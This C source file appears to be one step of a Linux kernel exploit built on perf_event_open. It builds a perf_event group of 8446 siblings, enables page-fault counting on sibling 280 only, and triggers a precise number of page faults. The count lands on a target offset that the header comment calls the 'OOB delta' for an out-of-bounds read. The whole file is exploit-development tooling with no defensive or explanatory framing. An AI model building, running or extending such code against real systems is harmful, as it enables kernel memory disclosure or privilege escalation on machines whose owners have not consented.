/*
 * Calibrate sibling-280 PAGE_FAULTS count to the exact OOB delta (no OOB read).
 * Leader + 8446 disabled siblings; only sibling 280 counts page faults.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif
#define PERF_TYPE_SOFTWARE 1
#define PERF_COUNT_SW_CPU_CLOCK 0
#define PERF_COUNT_SW_PAGE_FAULTS 2
#define PERF_COUNT_SW_DUMMY 9
#define PERF_FORMAT_GROUP (1ULL << 3)
#define PERF_EVENT_IOC_ENABLE 0x2400
#define PERF_EVENT_IOC_DISABLE 0x2401
#define PERF_EVENT_IOC_RESET 0x2403

struct attr_min {
    uint32_t type, size;
    uint64_t config, sample_period, sample_type, read_format, flags;
    uint32_t wakeup_events, bp_type;
    uint64_t bp_addr, bp_len;
    uint64_t branch_sample_type, sample_regs_user;
    uint32_t sample_stack_user;
    int32_t clockid;
    uint64_t sample_regs_intr;
    uint32_t aux_watermark;
    uint16_t sample_max_stack, reserved2;
    uint32_t aux_sample_size, reserved3;
};

static int ev_open(uint64_t config, uint64_t read_format, int group_fd, int disabled) {
    struct attr_min a;
    memset(&a, 0, sizeof(a));
    a.type = PERF_TYPE_SOFTWARE;
    a.size = 112;
    a.config = config;
    a.read_format = read_format;
    a.flags = disabled ? 1ULL : 0ULL;
    return (int)syscall(__NR_perf_event_open, &a, 0, -1, group_fd, 0);
}

static int calibrate(int fd, int pages, int *count_out) {
    size_t len = (size_t)pages * 4096;
    char *p = mmap(NULL, len, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED)
        return -1;
    madvise(p, len, MADV_NOHUGEPAGE);
    for (int i = 0; i < pages; i++)
        p[(size_t)i * 4096] = 1; /* pre-fault, event disabled */
    madvise(p, len, MADV_DONTNEED);
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    for (int i = 0; i < pages; i++)
        p[(size_t)i * 4096] = 2;
    uint64_t count = 0;
    ssize_t r = read(fd, &count, sizeof(count));
    munmap(p, len);
    if (r != 8)
        return -1;
    *count_out = (int)count;
    return 0;
}

int main(int argc, char **argv) {
    int n = argc > 1 ? atoi(argv[1]) : 8446;
    int target_idx = 280;
    int want = 1888;
    struct rlimit rl = {20000, 20000};
    int leader = ev_open(PERF_COUNT_SW_CPU_CLOCK, PERF_FORMAT_GROUP, -1, 0);
    if (leader < 0) {
        printf("leader: %s\n", strerror(errno));
        return 1;
    }
    int target_fd = -1;
    int made = 0;
    for (int i = 0; i < n; i++) {
        int fd = ev_open(i == target_idx ? PERF_COUNT_SW_PAGE_FAULTS
                                         : PERF_COUNT_SW_DUMMY,
                         0, leader, i == target_idx ? 0 : 1);
        if (fd < 0) {
            printf("sibling %d: %s\n", i, strerror(errno));
            break;
        }
        if (i == target_idx)
            target_fd = fd;
        made++;
    }
    printf("siblings=%d target_fd=%d\n", made, target_fd);
    int count = -1;
    if (calibrate(target_fd, want, &count) == 0) {
        printf("count=%d want=%d delta_needed_from_P_OFF=%d (align8=%d)\n",
               count, want, count - 0x730, ((count - 0x730) % 8) == 0);
    } else {
        printf("calibration failed: %s\n", strerror(errno));
    }
    ioctl(leader, PERF_EVENT_IOC_DISABLE, 0);
    return 0;
}
